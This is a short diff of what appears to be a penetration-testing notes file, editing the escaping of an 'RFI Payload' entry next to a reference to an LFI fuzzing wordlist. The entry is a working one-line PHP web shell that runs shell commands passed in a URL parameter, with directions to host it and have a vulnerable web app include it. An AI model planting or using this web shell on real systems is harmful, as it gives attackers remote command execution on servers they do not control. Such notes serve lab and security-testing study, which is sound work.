@@ -82,7 +82,7 @@ Both: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-hu
 
 #### RFI Payload
 
-<code><?php echo shell_exec($_GET['cmd']); ?></code>
+<code>\<?php echo shell_exec($_GET['cmd']); ?\></code>
 
 Store in a file on local host, navigate to it via the wb app and pass commands to it.
 
